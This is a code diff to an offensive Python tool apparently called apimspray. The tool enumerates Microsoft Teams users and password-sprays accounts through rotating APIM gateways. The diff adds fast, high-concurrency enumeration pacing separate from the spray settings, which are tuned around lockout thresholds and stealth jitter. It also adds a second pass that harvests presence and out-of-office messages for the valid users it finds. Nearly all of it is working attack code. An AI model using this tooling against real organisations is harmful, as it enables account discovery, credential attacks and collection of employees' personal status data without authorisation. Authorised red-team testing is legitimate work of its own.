@@ -39,13 +39,23 @@ class TermColors:
     MAGENTA = "\033[35m"
     CYAN = "\033[36m"
 
-# Pacing configurations
+# Pacing configurations (spray / validate)
 PACE_SETTINGS = {
     "high": {"workers": 15, "delay": 0.1, "count": 10, "lockout": 5, "safe": 20, "jitter": 0},
     "medium": {"workers": 5, "delay": 1, "count": 5, "lockout": 10, "safe": 10, "jitter": 10},
     "mid": {"workers": 5, "delay": 1, "count": 5, "lockout": 10, "safe": 10, "jitter": 10},
     "low": {"workers": 2, "delay": 5, "count": 2, "lockout": 15, "safe": 5, "jitter": 20},
     "stealth": {"workers": 1, "delay": 30, "count": 1, "lockout": 20, "safe": 1, "jitter": 40},
+}
+
+# Enumerate pacing (separate from spray — enum is read-only, no lockout risk)
+# TeamFiltration uses maxDegreeOfParallelism: 300 with no delays
+ENUM_PACE_SETTINGS = {
+    "high": {"workers": 100, "delay": 0, "jitter": 0},
+    "medium": {"workers": 50, "delay": 0, "jitter": 0},
+    "mid": {"workers": 50, "delay": 0, "jitter": 0},
+    "low": {"workers": 20, "delay": 0.1, "jitter": 0},
+    "stealth": {"workers": 5, "delay": 1, "jitter": 20},
 }
 
 # Smart Lockout
@@ -606,10 +616,13 @@ class TeamsEnumerator:
             print_error(f"Skype token request failed: {e}")
             return False
 
-    def enumerate_user(self, email):
+    def enumerate_user(self, email, fetch_presence=False):
         """
         Check if a user exists via the Teams externalsearchv3 endpoint.
         Routes through APIM gateways when available, falls back to direct.
+
+        When fetch_presence=False (default), skips the inline presence call
+        to keep enumeration fast. Presence can be fetched in a separate pass.
 
         Returns a dict with enumeration results.
         """
@@ -676,11 +689,12 @@ class TeamsEnumerator:
                                 result["tenant_id"] = tenant_id
                                 result["mri"] = user_obj.get("mri")
 
-                                # Attempt presence/OOO fetch
-                                ooo = self._fetch_presence(user_obj.get("mri"))
-                                if ooo:
-                                    result["out_of_office"] = ooo.get("message")
-                                    result["presence"] = ooo.get("availability")
+                                # Only fetch presence inline if explicitly requested
+                                if fetch_presence:
+                                    ooo = self._fetch_presence(user_obj.get("mri"))
+                                    if ooo:
+                                        result["out_of_office"] = ooo.get("message")
+                                        result["presence"] = ooo.get("availability")
                                 return result
                 except (json.JSONDecodeError, KeyError, TypeError):
                     pass
@@ -872,22 +886,22 @@ def process_attempt(
 
 def process_enum_attempt(
     email, teams_enumerator, pace_config, logger,
-    valid_users_set, lock, stop_event, fetch_presence,
+    valid_users_set, valid_mris, lock, stop_event,
 ):
     if stop_event.is_set():
         return
-    result = teams_enumerator.enumerate_user(email)
+    result = teams_enumerator.enumerate_user(email, fetch_presence=False)
     timestamp = utc_now_str()
     gateway_host = result.get("gateway", "unknown")
 
     if result["valid"]:
         with lock:
             valid_users_set.add(email)
+            if result.get("mri"):
+                valid_mris[email] = result["mri"]
         display_parts = [email]
         if result["display_name"]:
             display_parts.append(f"({result['display_name']})")
-        if result["out_of_office"]:
-            display_parts.append(f"[OOO: {result['out_of_office'][:60]}]")
         display_str = " ".join(display_parts)
         console_msg = f"{style('[+]', TermColors.GREEN, TermColors.BOLD)} {style(display_str, TermColors.GREEN, TermColors.BOLD)} | APIM: {gateway_host}"
         file_msg = f"{email} | VALID | ObjID: {result.get('object_id', 'N/A')} | DisplayName: {result.get('display_name', 'N/A')} | TenantID: {result.get('tenant_id', 'N/A')} | APIM: {gateway_host}"
@@ -1182,9 +1196,11 @@ def _run_enumerate(args):
         print_info(f"User list randomized ({len(users)} users shuffled)")
 
     logger = Logger(args.output)
-    pace_config = PACE_SETTINGS[args.pace]
-    workers = pace_config["workers"]
-    base_delay = pace_config["delay"]
+
+    # Use enumerate-specific pacing (much faster than spray pacing — no lockout risk)
+    enum_pace = ENUM_PACE_SETTINGS[args.pace]
+    workers = enum_pace["workers"]
+    base_delay = enum_pace["delay"]
 
     print_info(f"Starting apimspray")
     print_info(f"Mode: {style('enumerate', TermColors.MAGENTA, TermColors.BOLD)} (Teams User Enumeration)")
@@ -1193,7 +1209,7 @@ def _run_enumerate(args):
     print_info(f"Login Gateways: {style(str(len(login_urls)), TermColors.MAGENTA, TermColors.BOLD)} (rotating)")
     print_info(f"Workers: {style(str(workers), TermColors.MAGENTA, TermColors.BOLD)}, Delay: {style(f'{base_delay}s', TermColors.MAGENTA, TermColors.BOLD)}")
     if not args.no_presence:
-        print_info(f"Presence/OOO Fetch: {style('ENABLED', TermColors.GREEN, TermColors.BOLD)}")
+        print_info(f"Presence/OOO Fetch: {style('ENABLED (post-enum pass)', TermColors.GREEN, TermColors.BOLD)}")
     else:
         print_info(f"Presence/OOO Fetch: {style('DISABLED', TermColors.YELLOW, TermColors.BOLD)}")
 
@@ -1219,6 +1235,7 @@ def _run_enumerate(args):
             print_warn("Cannot determine domain for sanity check -- skipping")
 
     valid_users_set = set()
+    valid_mris = {}  # email -> mri, collected for post-enum presence pass
     lock = threading.Lock()
     stop_event = threading.Event()
     progress_tracker = ProgressTracker() if args.verbose else None
@@ -1228,21 +1245,23 @@ def _run_enumerate(args):
 
     print_info(f"Beginning enumeration of {len(users)} candidate users...")
 
+    # Phase 1: Fast enumeration (no inline presence fetch, minimal delays)
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = []
         for email in users:
             if stop_event.is_set():
                 break
-            current_delay = base_delay
-            if pace_config["jitter"] > 0 and base_delay > 0:
-                jitter_val = (base_delay * pace_config["jitter"]) / 100.0
-                current_delay += random.uniform(-jitter_val, jitter_val)
-                current_delay = max(0, current_delay)
-            if current_delay > 0 and workers == 1:
+            # Only apply delay in stealth mode
+            if base_delay > 0 and workers == 1:
+                current_delay = base_delay
+                if enum_pace["jitter"] > 0:
+                    jitter_val = (base_delay * enum_pace["jitter"]) / 100.0
+                    current_delay += random.uniform(-jitter_val, jitter_val)
+                    current_delay = max(0, current_delay)
                 time.sleep(current_delay)
             future = executor.submit(
-                process_enum_attempt, email, enumerator, pace_config,
-                logger, valid_users_set, lock, stop_event, not args.no_presence,
+                process_enum_attempt, email, enumerator, enum_pace,
+                logger, valid_users_set, valid_mris, lock, stop_event,
             )
             futures.append(future)
         for f in as_completed(futures):
@@ -1257,6 +1276,44 @@ def _run_enumerate(args):
     if progress_tracker:
         progress_tracker.end_round()
         progress_tracker.end_session()
+
+    # Phase 2: Presence/OOO pass (only for valid users, runs after enum completes)
+    if not args.no_presence and valid_mris:
+        print_info(f"Fetching presence/OOO for {style(str(len(valid_mris)), TermColors.GREEN, TermColors.BOLD)} valid users...")
+        presence_workers = min(20, len(valid_mris))
+
+        def _fetch_and_log_presence(email, mri):
+            ooo = enumerator._fetch_presence(mri)
+            if ooo and (ooo.get("message") or ooo.get("availability")):
+                presence_str = ooo.get("availability", "")
+                ooo_msg = ooo.get("message", "")
+                display_parts = [email]
+                if presence_str:
+                    display_parts.append(f"[{presence_str}]")
+                if ooo_msg:
+                    display_parts.append(f"OOO: {ooo_msg[:80]}")
+                console_msg = f"{style('[*]', TermColors.CYAN, TermColors.BOLD)} {' '.join(display_parts)}"
+                print(console_msg)
+                logger.log_enum_detail({
+                    "timestamp": utc_now_str(),
+                    "email": email,
+                    "presence_update": True,
+                    "presence": presence_str,
+                    "out_of_office": ooo_msg,
+                })
+
+        with ThreadPoolExecutor(max_workers=presence_workers) as executor:
+            presence_futures = []
+            for email, mri in valid_mris.items():
+                if mri:
+                    presence_futures.append(executor.submit(_fetch_and_log_presence, email, mri))
+            for f in as_completed(presence_futures):
+                try:
+                    f.result()
+                except Exception:
+                    pass
+
+        print_success("Presence/OOO pass complete")
 
     _print_enum_summary(logger, valid_users_set, users)
 
